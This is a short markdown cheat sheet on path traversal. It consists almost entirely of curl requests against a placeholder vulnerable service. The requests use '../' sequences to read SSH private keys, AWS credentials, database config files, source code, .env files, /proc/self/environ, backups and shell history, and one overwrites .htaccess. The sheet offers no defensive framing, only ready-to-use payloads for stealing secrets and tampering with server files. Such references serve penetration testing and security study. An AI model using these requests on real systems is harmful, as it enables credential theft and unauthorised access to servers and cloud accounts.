# Path Traversal

## Table of Contents
- [Information Disclosure](#information-disclosure)
- [Arbitrary File Modification](#arbitrary-file-modification)

## Information Disclosure

### Credentials used for remote access can be exposed.

- SSH key file exposure [^1]
    ```bash
    curl https://[VULNERABLE-SERVICE]/read?filename=../../../../home/user/.ssh/id_rsa
    ```

- AWS credential exposure
    ```bash
    curl https://[VULNERABLE-SERVICE]/read?filename=../../../../home/user/.aws/credentials
    ```
  
### Sensitive information used in project can be exposed.

- Hard-coded secret information exposure
    ```bash
    curl https://[VULNERABLE-SERVICE]/read?filename=../../../../config/db_config.php
    ```

- Source code exposure
    ```bash
    curl https://[VULNERABLE-SERVICE]/read?filename=../../../../var/www/html/index.php
    ```

- Application’s environment variable information exposure
    - By reading the process environment:
        ```bash
        curl https://[VULNERABLE-SERVICE]/read?filename=../../../../proc/self/environ
        ```
    - By reading the well-known file:
        ```bash
        curl https://[VULNERABLE-SERVICE]/read?filename=../../../../.env
        ```

- Backup file exposure
    ```bash
    curl https://[VULNERABLE-SERVICE]/read?filename=../../../../backup/backup.zip
    ```

- Environment variable exposure
    ```bash
    curl https://[VULNERABLE-SERVICE]/read?filename=../../../../home/user/.bashrc
    ```

- Command history exposure
    ```bash
    curl https://[VULNERABLE-SERVICE]/read?filename=../../../../home/user/.bash_history
    ```

## Arbitrary File Modification

### Key files can be overwritten or deleted.

- Overwrite .htaccess file
    ```bash
    curl https://[VULNERABLE-SERVICE]/upload?filename=../../../../.htaccess
    ```

[^1]: Path to the user's home directory can be found in /etc/passwd.